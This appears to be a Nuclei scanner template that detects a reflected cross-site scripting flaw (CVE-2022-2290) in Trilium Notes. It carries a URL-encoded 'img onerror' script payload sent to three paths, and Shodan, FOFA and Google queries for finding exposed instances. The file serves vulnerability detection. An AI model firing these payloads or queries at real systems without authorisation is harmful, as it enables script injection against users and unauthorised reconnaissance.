http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - No handler matched for custom <img src=x onerror=alert(document.domain)>
    - Note '<img src=x onerror=alert(document.domain)>' not found
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 404
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/custom/%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
  - '{{BaseURL}}/share/api/notes/%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
  - '{{BaseURL}}/share/api/images/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/filename'
  stop-at-first-match: true
id: CVE-2022-2290
info:
  author: dbrwsky
  classification:
    cpe: cpe:2.3:a:trilium_project:trilium:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-2290
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.91417
    epss-score: 0.074
  description: Trilium prior to 0.52.4, 0.53.1-beta contains a cross-site scripting
    vulnerability which can allow an attacker to execute arbitrary script code in
    the browser of an unsuspecting user in the context of the affected site.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, leading to
    potential data theft, session hijacking, or defacement of the affected Trilium
    instance.

    '
  metadata:
    fofa-query: title="trilium notes"
    google-query: intitle:"trilium notes"
    max-request: 3
    product: trilium
    shodan-query:
    - title:"Trilium Notes"
    - http.title:"trilium notes"
    vendor: trilium_project
    verified: true
  name: Trilium <0.52.4 - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/367c5c8d-ad6f-46be-8503-06648ecf09cf/
  - https://github.com/zadam/trilium
  - https://github.com/zadam/trilium/commit/3faae63b849a1fabc31b823bb7af3a84d32256a7
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2290
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Upgrade Trilium to version 0.52.4 or later, which includes proper
    input sanitization to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,trilium,huntr,trilium_project,vuln
